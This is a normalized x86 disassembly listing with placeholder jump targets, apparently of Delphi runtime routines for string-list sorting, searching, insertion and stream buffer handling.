mov ecx ebx
call sub_402930
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40415c
mov ebx eax
test ebx ebx
je r-xdata
sub_4179e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417a5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a63
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_417a70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417b33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4043bc
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_4180d0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404084
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c0d0
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b3a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_417b44
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_417b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417ba8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418c0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bf7
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_417bfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417c99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_417c7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_418758
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403f8c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c83
mov eax [ ebp - 0x4 ]
call sub_417624
retn
sub_417ca8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417d49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d50
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_417d2c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417624
retn
sub_417d58
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_417d90
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417e34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a948
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_417e0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4199e4
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41b5e8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e16
mov eax [ ebp - 0x4 ]
call sub_417624
retn
sub_417e40
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418c0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417e8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e92
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_417e98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417ee5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40415c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4189bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417eec
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_417ef8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405774
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_417f2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417f6f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404094
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f76
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_417f7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418030
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417568
xor edx edx
push ebp
push sub_418013
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41801a
mov eax [ ebp - 0x4 ]
call sub_417624
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f8c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_418040
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4180b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41c194
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c19c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4180bd
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41c23c
inc esi
dec ebx
jne r-xdata
sub_4180e8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_418104
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4173a0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404918
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41816c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41771c
jmp r-xdata
sub_418208
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404918
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_418248
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402930
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a04
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4182b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41771c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_418310
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418310
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_418334
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4183ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ef0
pop edi
pop esi
pop ebx
retn
sub_4183e8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_418410
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_418444
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4179e4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_418490
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41771c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4184e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_418410
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ef0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_402930
sub_41855c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41771c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ef0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4185b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41771c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4185f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418310
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4185f8
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4186a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_418704
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_4185f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_418758
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41878c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4187f0
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_418844
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030b4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
mov esp ebp
pop ebp
retn
sub_418890
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4030ac
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_418844
pop ecx
mov eax [ ebx ]
call sub_4030f0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_418844
pop ecx
sub_418914
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_418984
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
sub_4189bc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
sub_4189f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_418778
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_402734
